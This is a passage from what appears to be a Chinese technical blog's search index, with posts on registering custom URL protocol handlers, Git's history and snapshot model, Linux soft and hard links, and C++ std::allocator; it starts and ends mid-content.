class=\"line\">[HKEY_CLASSES_ROOT\\Show\\shell\\open]</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\Show\\shell\\open\\command]</span><br><span class=\"line\">@=&quot;\\&quot;C:\\\\Program Files\\\\ShowDemo\\\\show.exe\\&quot; \\&quot;%1\\&quot;&quot;</span><br></pre></td></tr></table></figure></p>\n<p>其中<code>Show</code>是自定义协议名，<code>C:\\Program Files\\ShowDemo\\show.exe</code>是目标可执行程序，<code>%1</code>是命令行参数序号。协议头不区分大小写，当访问<code>show://xxx</code>的时候，会适配这条规则，调用<code>C:\\Program Files\\ShowDemo\\show.exe</code>程序，并将<code>show://xxx</code>作为第二个参数传给<code>show.exe</code></p>\n<p>在浏览器中访问<code>smb://HereAreSomeParameters</code>，可以看到成功唤起了<code>show.exe</code>：<br><img src=\"show.png\" alt=\"\"></p>\n<h2 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux\"></a>Linux</h2><h3 id=\"KDE\"><a href=\"#KDE\" class=\"headerlink\" title=\"KDE\"></a>KDE</h3><p>在<code>/home/xuranus/workspace/ShowDemo</code>下创建<code>show</code>脚本，他用于在提示框中展示第一个命令行参数。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\">notify-send <span class=\"string\">&quot;Show&quot;</span> <span class=\"variable\">$1</span> --icon=dialog-information</span><br></pre></td></tr></table></figure>\n<ol>\n<li>在<code>~/.local/share/applications</code>下新建一个<code>show.desktop</code>，内容如下：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Desktop Entry]</span><br><span class=\"line\">Encoding=&quot;UTF-8&quot;</span><br><span class=\"line\">Version=1.0</span><br><span class=\"line\">Type=Application</span><br><span class=\"line\">Terminal=false</span><br><span class=\"line\">Exec=&quot;/home/xuranus/workspace/ShowDemo/show&quot; %U</span><br><span class=\"line\">Name=ShowDemoApp</span><br><span class=\"line\">Comment=This is a demo app to show command arg</span><br><span class=\"line\">Categories=Application;Network;</span><br><span class=\"line\">MimeType=x-scheme-handler/show;</span><br></pre></td></tr></table></figure>\n<p>执行：<code>update-desktop-database</code></p>\n<ol>\n<li>注册<code>show</code>协议：<code>xdg-mime default show.desktop x-scheme-handler/show</code></li>\n</ol>\n<p>在浏览器中访问<code>smb://HereAreSomeParameters</code>或用<code>xdg-open smb://HereAreSomeParameters</code>测试：</p>\n<p><img src=\"xdg.png\" alt=\"\"><br><img src=\"notify.png\" alt=\"\"></p>\n<h3 id=\"Gnome\"><a href=\"#Gnome\" class=\"headerlink\" title=\"Gnome\"></a>Gnome</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">gconftool-2 -t string -s /desktop/gnome/url-handlers/show/command &#x27;show &quot;%s&quot;&#x27;</span><br><span class=\"line\">gconftool-2 -s /desktop/gnome/url-handlers/show/needs_terminal false -t bool</span><br><span class=\"line\">gconftool-2 -s /desktop/gnome/url-handlers/show/enabled true -t bool</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/28607402\">后插件时代页面如何唤起本地程序</a></li>\n<li><a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa767914(v=vs.85\">Registering an Application to a URI Scheme</a>?redirectedfrom=MSDN)</li>\n<li><a href=\"https://blog.csdn.net/weixin_39622123/article/details/116675421\">ubuntu下浏览器调用本地应用程序</a></li>\n<li><a href=\"https://askubuntu.com/questions/514125/url-protocol-handlers-in-basic-ubuntu-desktop\">URL protocol handlers in basic Ubuntu Desktop</a></li>\n</ul>\n"},{"title":"深入理解Git的发展历史","url":"/2022/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Git%E5%BF%AB%E7%85%A7%E6%9C%BA%E5%88%B6/","content":"<blockquote>\n<p>研究大牛的作品是接近大牛的必要步骤——膜Linus Torvalds</p>\n</blockquote>\n<h2 id=\"版本控制的发展历史\"><a href=\"#版本控制的发展历史\" class=\"headerlink\" title=\"版本控制的发展历史\"></a>版本控制的发展历史</h2><p>创建一个<code>README.md</code>文件，写入两行文字:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Git is a distributed, open source version control system.</span><br><span class=\"line\">You can install git on Linux using binary release.</span><br></pre></td></tr></table></figure><br>我们将它作为这个文件的第一个版本，之后有一天，我想再对它做一点修改：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Git is a distributed, open source version control system.</span><br><span class=\"line\">You can install git on Linux, Windows using binary release.</span><br><span class=\"line\">Or you can compile from source code.</span><br></pre></td></tr></table></figure><br>在版本控制系统还没有出现之前，人们总是用不同的文件名来区分不同的文件版本。如果想未来能回滚到之前的版本，此时只能用<code>README_2.md</code>来去分它。随着版本越来越多，文件名越来越长，管理大量版本的文件成为了噩梦。</p>\n<span id=\"more\"></span>\n<p>1991-2002之间，即使CVS工具已经出现，但Linus一直使用<code>diff</code>和<code>patch</code>管理源码。<code>diff</code>和<code>patch</code>是对源码版本控制的两个最基本的概念。如今依然可以在Linux上直接使用这两个命令。<code>diff</code>是一个对比目录和文本文件差异的工具，在Linux上使用<code>diff -u README.md README_2.md</code>可以看到如下输出：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">--- README.md   2022-07-10 15:56:19.638578324 +0800</span><br><span class=\"line\">+++ README_2.md 2022-07-10 15:58:49.333566672 +0800</span><br><span class=\"line\">@@ -1,2 +1,3 @@</span><br><span class=\"line\"> Git is a distributed, open source version control system.</span><br><span class=\"line\">-You can install git on Linux using binary release.</span><br><span class=\"line\">+You can install git on Linux, Windows using binary release.</span><br><span class=\"line\">+Or you can compile from source code.</span><br></pre></td></tr></table></figure><br>输出中详细说明了两个文件修改时间的差异，内容的差异。<code>README.md</code>相比<code>README_2.md</code>修改了一行，新增了一行，此时不难发现<code>diff</code>输出中包含了两个版本之间切换的充分信息。<code>patch</code>是一个文件版本修改工具，<code>patch</code>可以将一个旧版本的文件依据一个diff文件修改成新一个版本的，也可以将一个新版本的文件恢复到旧版本。将刚才的<code>diff</code>输出保存成文件<code>diff.txt</code>：<code>diff -u README.md READMD_2.md &gt; diff.txt</code>，然后使用<code>patch README.md diff.txt</code>就可以将<code>READMD.md</code>修改成新版本，而用<code>patch -R READMD_2.md diff.txt</code>就可以将新版本的<code>README_2.md</code>切换成老版本。</p>\n<pre class=\"mermaid\">flowchart LR\n  v1(README.md) ---->| patch README.md diff.txt| v2(README_2.md)\n  v2 ---->| patch -R README_2.md diff.txt| v1\n  subgraph R [version 2]\n    v2\n  end\n  subgraph L [version 1]\n    v1\n  end</pre>\n\n<p>最早的版本控制工具RCS(Revision Control System)就是基于<code>diff</code>和<code>patch</code>实现了版本管理。通过在<strong>本地</strong>管理各个版本的diff文件，对外提供一套版本控制接口从而实现版本控制。</p>\n<pre class=\"mermaid\">flowchart LR\n  subgraph computer [diff files]\n    v1(version 1)\n    v1 --> v2(version 2)\n    v2 --> v3(version 3)\n  end\n  file(File) --> v1</pre>\n\n<p>CVS(Concurrent Versions System)于1985年诞生，是第一个被大规模应用的<strong>集中式</strong>版本控制工具，CVS使得多人协作开发成为可能。但CVS不支持原子化的提交，多人同时提交时可能会出现数据不完整的问题，于是SVN(Subversion)诞生了，它可以看作是改进版的SVN，实现了原子化的提交并优化了性能。但SVN还是集中式的版本控制工具，由于集中式的版本控制工具提交代码需要用到网络传输，导致延迟很大，提交需要排队；其次，集中式的存储导致服务器容易因为单点故障和黑客攻击丢失数据。</p>\n<pre class=\"mermaid\">flowchart LR\n  Host1 --network--> Server\n  Host2 --network--> Server\n  Host3 --network--> Server\nsubgraph Host1 [Host1]\n  F1(File)\nend\nsubgraph Host2 [Host2]\n  F2(File)\nend\nsubgraph Host3 [Host3]\n  F3(File)\nend\nsubgraph Server [Remote Server]\n  ServerRepo\nend\nsubgraph ServerRepo [Version Control Repo]\n  v1(version 1) --> v2(version 2)\n  v2 --> v3(version 3)\n  v3 --> v4(version 4)\nend</pre>\n\n<p>Linus坚定的反对使用集中式的版本控制工具，选择使用商业版的分布式版本控制工具BitKeeper，并于2005年开发<strong>分布式</strong>的版本控制工具Git，之后就一直使用Git来管理Linux源码。Git在每台设备上都有一个本地仓库，所以提交代码不涉及网络传输，只有将代码同步到服务器上才需要网络传输。由于分布式的设计，每台设备都可以作为服务器，有效的避免了单点故障和黑客攻击带来的数据损失。</p>\n<pre class=\"mermaid\">flowchart LR\nsubgraph Local2 [Host2]\n  LocalRepo2\nend\nsubgraph LocalRepo2 [Local Git Repo]\n  l2v1(version 1) --> l2v2(version 2)\n  l2v2 --> l2v3(version 3)\nend\nsubgraph Server [Remote Git Server]\n  ServerRepo\nend\nsubgraph ServerRepo [Git Repo]\n  v1(version 1) --> v2(version 2)\n  v2 --> v3(version 3)\nend\nsubgraph Local1 [Host1]\n  LocalRepo1\nend\nsubgraph LocalRepo1 [Local Git Repo]\n  l1v1(version 1) --> l1v2(version 2)\n  l1v2 --> l1v3(version 3)\nend\n\nLocal1 <--> Server\nLocal1 <----> Local2\nLocal2 <----> Server</pre>\n\n\n<h2 id=\"Git快照机制\"><a href=\"#Git快照机制\" class=\"headerlink\" title=\"Git快照机制\"></a>Git快照机制</h2><p>Git最大的特点就是快，除了得益于分布式的设计（本地代码仓），还得益于它独特的<strong>快照机制</strong>。<strong>分布式版本控制工具和集中式版本控制工具最主要的区别就是其对待数据的方式。</strong></p>\n<p>CVS、SVN等工具将文件的版本看作文件相对于原始版本的累计差异，存储版本也是存储原始版本文件已经各个版本的文件变更列表。</p>\n<p><img src=\"cvs.png\" alt=\"\"></p>\n<p>这种实现方式存在的问题就是，后续版本的信息依赖之前所有版本的信息，如果丢失一个版本的信息，后续的版本数据都会失效。获取某个版本的数据需要从第一个版本叠加计算之后的变更信息，所以性能较差。</p>\n<p><img src=\"git1.png\" alt=\"\"><br>Git则是记录和组装一系列快照流的微型系统，只关心文件数据的整体是否发生变化，而不是具体的文件内容。每次commit的时候保存一次快照，而每个快照都包含了<strong>完整</strong>的数据。相比与计算文件变更的叠加结果，创建快照和读取快照都是可以一瞬间完成，这就是为什么Git的性能如此之强的原因。</p>\n<p>关于文件快照的原理我将在另一篇博客中再做详细说明：<a href=\"/2022/07/10/深入理解文件快照\">深入理解文件快照</a></p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://www.baidu.com/link?url=9ySRiVFk6cGZ7rRgaa5KzKLb2XjdVCwqbMB6tSVpiiHvghlNzd9nqkWReEic8Uxk1cjS3T8sRCjh5g2JhT3RuZ9vls5MmNN9Cmbz9seZGgi&amp;wd=&amp;eqid=8276908800031d630000000662ca9c0c\">Git快照原理</a></li>\n<li><a href=\"https://www.zhihu.com/question/27680108/answer/2300327037\">如何理解git的快照？</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_40085040/article/details/109061495\">浅谈对“快照“的理解 — 深入Git第一篇</a></li>\n</ul>\n","tags":["Git"]},{"title":"深入理解Linux文件系统--软链接与硬链接","url":"/2022/07/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/","content":"<h2 id=\"inode\"><a href=\"#inode\" class=\"headerlink\" title=\"inode\"></a>inode</h2><p>硬盘的最小存储单位是扇区(Sector)，块(Block)由多个扇区组成。文件数据存储在块中。块的最常见的大小是4Kb，约为8个连续的扇区组成（每个扇区存储512字节）。计算机的内存是基于字节编址的，就像一个文件可能会占用多个Block，但是一个块只能存放一个文件。</p>\n<p>虽然，我们将文件存储在了块(Block)中，但是我们还需要一个空间来存储文件的元数据(Meta Data)，如：某个文件被分成几块、每一块在的地址、文件拥有者，创建时间，权限，大小等。这种存储文件元信息的区域就叫inode，译为索引节点(Index Node)。 每个文件都指向一个inode，存储文件的元信息。</p>\n<span id=\"more\"></span>\n<p>可以使用<code>stat</code>命令可以查看文件的inode信息。每个inode都有一个号码，Linux/Unix操作系统不使用文件名来区分文件，而是使用inode号码区分不同的文件。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ stat helloworld.txt</span><br><span class=\"line\">  File: helloworld.txt</span><br><span class=\"line\">  Size: 12              Blocks: 8          IO Block: 4096   regular file</span><br><span class=\"line\">Device: 259,2   Inode: 1188276     Links: 1</span><br><span class=\"line\">Access: (0644/-rw-r--r--)  Uid: ( 1000/ xuranus)   Gid: ( 1000/ xuranus)</span><br><span class=\"line\">Access: 2022-07-16 09:57:23.513371618 +0800</span><br><span class=\"line\">Modify: 2022-07-16 09:57:23.513371618 +0800</span><br><span class=\"line\">Change: 2022-07-16 09:57:23.513371618 +0800</span><br><span class=\"line\"> Birth: 2022-07-16 09:57:23.513371618 +0800</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"软链接和硬链接\"><a href=\"#软链接和硬链接\" class=\"headerlink\" title=\"软链接和硬链接\"></a>软链接和硬链接</h2><ul>\n<li>软链接(soft link)，又称符号链接(symbolic link)，是指向原文件的链接</li>\n<li>硬链接(hard link)，是对元文件的一种镜像拷贝</li>\n</ul>\n<p>创建软链接<code>helloworld_softlink.txt</code>指向源文件<code>helloworld.txt</code>：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ln -s helloworld.txt helloworld_softlink.txt</span><br></pre></td></tr></table></figure></p>\n<p>用<code>ls -l</code>可以看到它们的指向关系：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ls -l</span><br><span class=\"line\">total 4</span><br><span class=\"line\">lrwxrwxrwx 1 xuranus xuranus 14 Jul 16 09:58 helloworld_softlink.txt -&gt; helloworld.txt</span><br><span class=\"line\">-rw-r--r-- 1 xuranus xuranus 12 Jul 16 09:57 helloworld.txt</span><br></pre></td></tr></table></figure></p>\n<p>用<code>stat</code>查看他们具体的元数据：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ stat helloworld.txt</span><br><span class=\"line\">  File: helloworld.txt</span><br><span class=\"line\">  Size: 12              Blocks: 8          IO Block: 4096   regular file</span><br><span class=\"line\">Device: 259,2   Inode: 1188276     Links: 1</span><br><span class=\"line\">Access: (0644/-rw-r--r--)  Uid: ( 1000/ xuranus)   Gid: ( 1000/ xuranus)</span><br><span class=\"line\">Access: 2022-07-16 09:57:23.513371618 +0800</span><br><span class=\"line\">Modify: 2022-07-16 09:57:23.513371618 +0800</span><br><span class=\"line\">Change: 2022-07-16 09:57:23.513371618 +0800</span><br><span class=\"line\"> Birth: 2022-07-16 09:57:23.513371618 +0800</span><br><span class=\"line\"> </span><br><span class=\"line\">$ stat helloworld_softlink.txt </span><br><span class=\"line\">  File: helloworld_softlink.txt -&gt; helloworld.txt</span><br><span class=\"line\">  Size: 14              Blocks: 0          IO Block: 4096   symbolic link</span><br><span class=\"line\">Device: 259,2   Inode: 1188277     Links: 1</span><br><span class=\"line\">Access: (0777/lrwxrwxrwx)  Uid: ( 1000/ xuranus)   Gid: ( 1000/ xuranus)</span><br><span class=\"line\">Access: 2022-07-16 09:58:15.537706288 +0800</span><br><span class=\"line\">Modify: 2022-07-16 09:58:13.537853704 +0800</span><br><span class=\"line\">Change: 2022-07-16 09:58:13.537853704 +0800</span><br><span class=\"line\"> Birth: 2022-07-16 09:58:13.537853704 +0800</span><br></pre></td></tr></table></figure><br>可以看到两者拥有不同的大小、权限、inode号，说明符号链接和源文件指向不同的inode。</p>\n<p>接下来创建硬链接<code>helloworld_hardlink.txt</code>也指向<code>helloworld.txt</code><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ln helloworld.txt helloworld_hardlink.txt   </span><br></pre></td></tr></table></figure><br>再次<code>ls -l</code>，发现原文件<code>helloworld.txt</code>和硬链接<code>helloworld_hardlink.txt</code>的硬连接数增加成了2。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ls -l                                    </span><br><span class=\"line\">total 8</span><br><span class=\"line\">-rw-r--r-- 2 xuranus xuranus 12 Jul 16 09:57 helloworld_hardlink.txt</span><br><span class=\"line\">lrwxrwxrwx 1 xuranus xuranus 14 Jul 16 09:58 helloworld_softlink.txt -&gt; helloworld.txt</span><br><span class=\"line\">-rw-r--r-- 2 xuranus xuranus 12 Jul 16 09:57 helloworld.txt</span><br></pre></td></tr></table></figure><br><code>ls -i</code>可以看到原文件<code>helloworld.txt</code>和硬链接<code>helloworld_hardlink.txt</code>拥有同样的inode号<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ls -i                               </span><br><span class=\"line\">1188276 helloworld_hardlink.txt  1188277 helloworld_softlink.txt  1188276 helloworld.txt</span><br></pre></td></tr></table></figure><br>用<code>stat</code>检查属性会发现原文件<code>helloworld.txt</code>和硬链接<code>helloworld_hardlink.txt</code>所有的元数据也都相同：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ stat helloworld_hardlink.txt             </span><br><span class=\"line\">  File: helloworld_hardlink.txt</span><br><span class=\"line\">  Size: 12              Blocks: 8          IO Block: 4096   regular file</span><br><span class=\"line\">Device: 259,2   Inode: 1188276     Links: 2</span><br><span class=\"line\">Access: (0644/-rw-r--r--)  Uid: ( 1000/ xuranus)   Gid: ( 1000/ xuranus)</span><br><span class=\"line\">Access: 2022-07-16 09:57:23.513371618 +0800</span><br><span class=\"line\">Modify: 2022-07-16 09:57:23.513371618 +0800</span><br><span class=\"line\">Change: 2022-07-16 09:58:46.795994588 +0800</span><br><span class=\"line\"> Birth: 2022-07-16 09:57:23.513371618 +0800</span><br><span class=\"line\"></span><br><span class=\"line\">$ stat helloworld.txt         </span><br><span class=\"line\">  File: helloworld.txt</span><br><span class=\"line\">  Size: 12              Blocks: 8          IO Block: 4096   regular file</span><br><span class=\"line\">Device: 259,2   Inode: 1188276     Links: 2</span><br><span class=\"line\">Access: (0644/-rw-r--r--)  Uid: ( 1000/ xuranus)   Gid: ( 1000/ xuranus)</span><br><span class=\"line\">Access: 2022-07-16 09:59:27.228482936 +0800</span><br><span class=\"line\">Modify: 2022-07-16 09:57:23.513371618 +0800</span><br><span class=\"line\">Change: 2022-07-16 09:58:46.795994588 +0800</span><br><span class=\"line\"> Birth: 2022-07-16 09:57:23.513371618 +0800</span><br></pre></td></tr></table></figure></p>\n<p>删除远文件<code>helloworld.txt</code>，可以看到<code>helloworld_hardlink.txt</code>的硬链接计数降为了1<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ rm helloworld.txt </span><br><span class=\"line\">$ ls -l            </span><br><span class=\"line\">total 4</span><br><span class=\"line\">-rw-r--r-- 1 xuranus xuranus 12 Jul 16 09:57 helloworld_hardlink.txt</span><br><span class=\"line\">lrwxrwxrwx 1 xuranus xuranus 14 Jul 16 09:58 helloworld_softlink.txt -&gt; helloworld.txt</span><br></pre></td></tr></table></figure><br>此时硬链接<code>helloworld_hardlink.txt</code>还可以访问，而软链接`helloworld_softlink.txt已经无法找到指向的文件了：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ cat helloworld_hardlink.txt </span><br><span class=\"line\">Hello World</span><br><span class=\"line\">$ cat helloworld_softlink.txt</span><br><span class=\"line\">cat: helloworld_softlink.txt: No such file or directory</span><br></pre></td></tr></table></figure></p>\n<p>对于一个目录，分别创建软链接和硬链接。软链接创建成功，硬链接创建失败：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ mkdir dir </span><br><span class=\"line\">$ echo &#x27;Hello World&#x27; &gt; dir/helloworld.txt</span><br><span class=\"line\">$ ln -s dir dirsl</span><br><span class=\"line\">$ ln dir dirsl   </span><br><span class=\"line\">ln: dir: hard link not allowed for directory</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"soft-hard-link.drawio.png\" alt=\"\"><br>软链接指向一个新的inode，所以拥有独立的元数据，软链接文件的内容是指向文件的地址，所以源文件删除、重命名或移动位置都会导致软链接失效。硬链接则和原文件指向同一个inode，创建硬链接会增加对应inode的硬链接计数。</p>\n<p>文件系统初始化时就会为磁盘分配inode区和数据区，由于inode的索引号只在同一个文件系统有意义，所以硬链接的指向不能跨文件系统。</p>\n<p>总结软链接的区别如下：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>硬链接</th>\n<th>软链接</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>只能针对文件</td>\n<td>能针对文件和目录</td>\n</tr>\n<tr>\n<td>不能跨文件系统</td>\n<td>能跨文件系统</td>\n</tr>\n<tr>\n<td>删除源文件硬链接数减1</td>\n<td>删除源文件软链接失效</td>\n</tr>\n<tr>\n<td>和源文件指向同一个inode，共享的元数据</td>\n<td>有自己独有的inode，独立的元数据</td>\n</tr>\n</tbody>\n</table>\n</div>\n<blockquote>\n<p>当软链接指向一个目录的时候，不能使用<code>rm -rf</code>删除软链接，这会导致删除指向的目录。正确的方法是直接<code>rm</code>删除软链接</p>\n</blockquote>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://www.bilibili.com/video/BV1vT4y1g7b8?spm_id_from=333.337.search-card.all.click&amp;vd_source=7b12ced4d39cf756884de8d6e05af036\">Linux文件系统的软链接与硬链接之彻底理解</a></li>\n<li><a href=\"bilibili.com/video/BV16P4y1s7ke/?spm_id_from=333.788.recommend_more_video.-1&amp;vd_source=7b12ced4d39cf756884de8d6e05af036\">文件系统技术内幕</a></li>\n<li><a href=\"https://ostechnix.com/explaining-soft-link-and-hard-link-in-linux-with-examples/\">Explaining Soft Link And Hard Link In Linux With Examples</a></li>\n</ul>\n","categories":["大话存储"],"tags":["存储","文件系统","Linux"]},{"title":"深入理解std::allocator<T>","url":"/2022/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3std-allocator/","content":"<p>请求堆上分配内存需要操作系统的参与，频繁的向请求内存开销很大。为了优化这个问题，可以把预先分配一部分内存放在池子里。</p>\n<p>C++在堆上创建对象一般是用<code>new</code>，<code>new</code>的执行包含了两个过程：</p>\n<ol>\n<li>分配内存</li>\n<li>初始化对象</li>\n</ol>\n<p>而<code>delete</code>的执行也包含了两个过程：</p>\n<ol>\n<li>对象析构</li>\n<li>释放内存</li>\n</ol>\n<p>当创建单个对象的时候，我们拥有构造对象所需的值，我们通常希望内存分配和对象初始化组合在一起；但是连续分配一堆对象的时候，我们往往希望分配内存和对象初始化分离，先分配一大快内存，在需要时再按需执行对象的初始化，此时如果将内存分配和对象初始化放在一起则会导致不必要的性能开销。例如<code>new std::vector&lt;T&gt;(10)</code>，我们希望只分配10个<code>T</code>类型的空间，而不执行<code>T</code>的默认构造方法，只有在<code>emplace_back</code>的时候才对内存初始化。</p>\n<span id=\"more\"></span>\n<p>标准库中提供的<code>std::allocator&lt;T&gt;</code>模板类允许我们将内存分配和对象初始化分离，使用<code>std::allocator&lt;T&gt;</code>通常会提供更好的性能和更灵活的内存管理能力。</p>\n<p><code>std::allocator&lt;T&gt;</code>定义在头文件<code>&lt;memory&gt;</code>中，提供一种类型感知的内存分配方法，它分配的内存是原始的、未构造的。</p>\n<p>allocator分配的内存是未构造的(unconstructed)。我们按需要在此内存中构造对象。在新标准库中，construct成员函数接受一个指针和零个或多个额外参数，在给定位置构造一个元素。额外参数用来初始化构造的对象。类似make_shared的参数，这些额外参数必须是与构造的对象的类型相匹配的合法的初始化器。</p>\n<p>在早期版本的标准库中，construct只接受两个参数：指向创建对象位置的指针和一个元素类型的值。因此，我们只能将一个元素拷贝到未构造空间中，而不能用元素类型的任何其它构造函数来构造一个元素。还未构造对象的情况下就使用原始内存是错误的。为了使用allocator返回的内存，我们必须用construct构造对象。使用未构造的内存，其行为是未定义的。</p>\n<p><code>std::allocator&lt;T&gt;</code>支持的方法如下：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>std::allocator&lt;T&gt;()</code></td>\n<td>构造一个能够分配<code>T</code>类型对象的allocator对象</td>\n</tr>\n<tr>\n<td><code>T* allocate(int n)</code></td>\n<td>分配一段原始的未初始化的内存，长度为 <code>n * sizeof(T)</code>，返回分配的地址</td>\n</tr>\n<tr>\n<td><code>deallocate(T* p, n)</code></td>\n<td>释放指针<code>p</code>开始的，长度为<code>n * sizeof(T)</code>的连续内存空间。<code>p</code>必须是<code>allocate</code>返回的地址，且<code>n</code>必须是<code>p</code>指向内存创建时候的大小。调用之前必须先调用<code>destroy()</code></td>\n</tr>\n<tr>\n<td><code>construct(T* p, args...)</code></td>\n<td>在<code>p</code>指向的地址处用<code>args</code>参数列表构造<code>T</code>类型对象</td>\n</tr>\n<tr>\n<td><code>destroy(T* p)</code></td>\n<td>对<code>p</code>指向的地址的对象执行析构</td>\n</tr>\n</tbody>\n</table>\n</div>\n<pre class=\"mermaid\">flowchart LR\n  subgraph new [new]\n    allocate --> construct\n  end\n  subgraph delete [delete]\n    destroy --> deallocate\n  end\n  construct --> destroy</pre>\n\n<p>使用<code>std::allocator&lt;T&gt;</code>来管理一个对象的生命周期时，先用<code>allocate</code>分配一段原始的、未初始化的内存，然后用<code>construct()</code>在这段内存上初始化对象。用<code>destroy()</code>析构对象，析构后的内存可以用<code>deallocate()</code>归还给操作系统，也可以再次用<code>construct()</code>在上面构造其他对象。</p>\n<blockquote>\n<p>传递给<code>deallocate()</code>的指针不能为空，它必须指向由<code>allocate()</code>分配的内存。而且，传递给<code>deallocate()</code>的大小参数必须与调用<code>allocate()</code>分配内存时提供的大小参数具有一样的值</p>\n</blockquote>\n<p>标准库还为<code>std::allocator&lt;T&gt;</code>类定义了两个伴随算法，可以在迭代器指向的未初始化内存中创建对象：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>函数</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>uninitialized_copy(std::iterator&lt;T&gt; begin, std::iterator&lt;T&gt; end, std::iterator&lt;T&gt; iter)</code></td>\n<td>从迭代器<code>begin</code>到<code>end</code>之间的内存依次拷贝到<code>iter</code>开始的的未初始化的内存中</td>\n</tr>\n<tr>\n<td><code>uninitialized_copy_n(std::iterator&lt;T&gt; begin, int n, std::iterator&lt;T&gt; iter)</code></td>\n<td>从迭代器<code>begin</code>开始，拷贝<code>n</code>个元素到<code>iter</code>开始的内存中</td>\n</tr>\n<tr>\n<td><code>uninitialized_fill(std::iterator&lt;T&gt; begin, std::iterator&lt;T&gt; end, T v)</code></td>\n<td>将<code>begin</code>和<code>end</code>之间的内容用<code>v</code>填充</td>\n</tr>\n<tr>\n<td></td>\n</tr>\n<tr>\n<td><code>uninitialized_fill_n(std::iterator&lt;T&gt; begin, int n, T v)</code></td>\n<td>从<code>begin</code>开始的位置依次拷贝<code>n</code>个值为<code>v</code>的对象</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p><code>std::allocator&lt;T&gt;</code>是STL容器的默认内存分配器。你还可以替换自己的分配器，这允许你控制标准容器分配内存的方式。</p>\n<p>例子：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*================================================================</span></span><br><span class=\"line\"><span class=\"comment\">*   Copyright (C) 2022 XUranus All rights reserved.</span></span><br><span class=\"line\"><span class=\"comment\">*   </span></span><br><span class=\"line\"><span class=\"comment\">*   File:         test_allocator.cpp</span></span><br><span class=\"line\"><span class=\"comment\">*   Author:       XUranus</span></span><br><span class=\"line\"><span class=\"comment\">*   Date:         2022-06-17-</span></span><br><span class=\"line\"><span class=\"comment\">*   Description:  </span></span><br><span class=\"line\"><span class=\"comment\">*</span></span><br><span class=\"line\"><span class=\"comment\">================================================================*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;memory&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cassert&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">TEST1</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    std::allocator&lt;std::string&gt; strAlloc;</span><br><span class=\"line\">    std::string *str = strAlloc.<span class=\"built_in\">allocate</span>(<span class=\"number\">3</span>);</span><br><span class=\"line\">    std::string *p = str;</span><br><span class=\"line\"></span><br><span class=\"line\">    strAlloc.<span class=\"built_in\">construct</span>(p); <span class=\"comment\">// &quot;&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">assert</span>(p-&gt;<span class=\"built_in\">empty</span>());</span><br><span 